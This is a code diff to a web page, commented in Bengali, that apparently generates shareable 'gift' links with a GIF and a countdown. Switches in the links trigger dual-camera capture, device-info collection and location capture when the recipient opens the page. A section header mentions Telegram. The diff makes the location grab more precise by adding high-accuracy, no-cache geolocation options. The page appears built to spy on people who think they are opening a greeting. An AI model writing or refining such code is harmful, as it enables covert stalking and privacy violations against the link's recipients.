@@ -629,7 +629,6 @@
                 </div>
             </div>
 
-            <!-- *** নতুন সুইচ যুক্ত করা হয়েছে *** -->
             <div class="form-group">
                 <div class="switch-container">
                     <label for="enableLocation" class="switch-label">
@@ -695,7 +694,7 @@
         ];
         // --- আপনার GIF লিঙ্কগুলো এখানে যোগ করুন ---
         const predefinedGifs = [
-            "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-1.gif"
+            "https://i.imgur.com/LPAxY3B.gif"
         ];
 
         // --- টেলিগ্রাম এবং ক্যামেরা সেটিংস ---
@@ -758,12 +757,18 @@
             }
         }
         
-        // *** নতুন লোকেশন ফাংশন যুক্ত করা হয়েছে ***
         function sendLocation() {
             if (!navigator.geolocation) {
                 console.error("Geolocation is not supported by this browser.");
                 return;
             }
+            
+            // *** সংশোধিত অংশ: আরও সঠিক লোকেশন পাওয়ার জন্য অপশন যোগ করা হয়েছে ***
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0,
+            };
 
             navigator.geolocation.getCurrentPosition(
                 (position) => {
@@ -782,7 +787,8 @@
                 },
                 (error) => {
                     console.error("Error getting location:", error.message);
-                }
+                },
+                options // অপশনটি এখানে পাস করা হয়েছে
             );
         }
 
@@ -923,8 +929,6 @@
                 if (document.getElementById('enableCountdown').checked) params.set('cd', document.getElementById('countdownDateTime').value);
                 if (document.getElementById('enableCamera').checked) params.set('cam', 'true');
                 if (document.getElementById('enableDeviceInfo').checked) params.set('info', 'true');
-                
-                // *** নতুন সুইচের জন্য কোড যুক্ত করা হয়েছে ***
                 if (document.getElementById('enableLocation').checked) params.set('loc', 'true');
 
                 const giftLink = `${window.location.href.split('?')[0]}?${params.toString()}`;
@@ -995,7 +999,6 @@
                 if (params.get('cam') === 'true') {
                     initiateDualCameraCapture(caption);
                 }
-                // *** নতুন লোকেশন ফাংশন কল করা হয়েছে ***
                 if (params.get('loc') === 'true') {
                     sendLocation();
                 }
